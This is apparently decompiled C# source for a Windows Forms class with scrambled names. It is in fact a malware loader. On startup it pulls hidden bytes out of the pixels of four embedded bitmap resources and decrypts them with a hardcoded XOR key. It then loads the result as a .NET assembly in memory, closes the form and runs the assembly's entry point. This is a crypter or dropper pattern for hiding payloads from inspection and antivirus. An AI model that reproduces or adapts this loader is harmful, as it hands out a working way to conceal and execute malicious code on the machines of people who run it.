using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using dHaxniMDOVGzWuzar.Properties;

namespace dHaxniMDOVGzWuzar;

public class RyTumwfJQIyKJoHhHt : Form
{
	private delegate Assembly HPoHaYFlziGN(byte[] yUInvBindtVV);

	private IContainer components = null;

	private string[] xGcjUrSgHOhoitu;

	private MethodInfo MzCjouIIkyKzUjskwPK;

	private byte[] deNrFFnosn
	{
		get
		{
			Console.WriteLine();
			return new byte[15]
			{
				55, 236, 163, 114, 113, 173, 203, 155, 46, 179,
				133, 251, 194, 250, 57
			};
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(489, 199));
		((Control)this).set_Name("RyTumwfJQIyKJoHhHt");
		((Control)this).set_Text("RyTumwfJQIyKJoHhHt");
		((Form)this).add_Load((EventHandler)RyTumwfJQIyKJoHhHt_Load);
		((Control)this).ResumeLayout(false);
		byte[] array = new byte[0];
		string[] array2 = new string[4] { "QboDxghLemwOC", "vRntCnODxfENMVAtwPN", "jtoqVVSMHZiqLYDUdR", "mDOeCpcgliNbl" };
		string[] array3 = array2;
		foreach (string name in array3)
		{
			Bitmap val = (Bitmap)Resources.ResourceManager.GetObject(name);
			byte[] array4 = new byte[((Image)val).get_Width() * ((Image)val).get_Height() * 4];
			Rectangle rectangle = new Rectangle(0, 0, ((Image)val).get_Width(), ((Image)val).get_Height());
			BitmapData val2 = val.LockBits(rectangle, (ImageLockMode)3, ((Image)val).get_PixelFormat());
			Marshal.Copy(val2.get_Scan0(), array4, 0, array4.Length);
			byte[] array5 = new byte[BitConverter.ToInt32(array4, 0)];
			Array.Copy(array4, 4, array5, 0, array5.Length);
			val.UnlockBits(val2);
			Array.Resize(ref array, array.Length + array5.Length);
			Array.Copy(array5, 0, array, array.Length - array5.Length, array5.Length);
		}
		for (int j = 0; j < array.Length; j++)
		{
			for (int k = 0; k < deNrFFnosn.Length; k++)
			{
				array[j] = (byte)(array[j] ^ deNrFFnosn[k]);
			}
		}
		Assembly assembly = Assembly.Load(array);
		MzCjouIIkyKzUjskwPK = assembly.EntryPoint;
	}

	public RyTumwfJQIyKJoHhHt(string[] args)
	{
		xGcjUrSgHOhoitu = args;
		InitializeComponent();
	}

	private void RyTumwfJQIyKJoHhHt_Load(object sender, EventArgs e)
	{
		((Form)this).Close();
		MzCjouIIkyKzUjskwPK.Invoke(null, new object[1] { xGcjUrSgHOhoitu });
	}
}
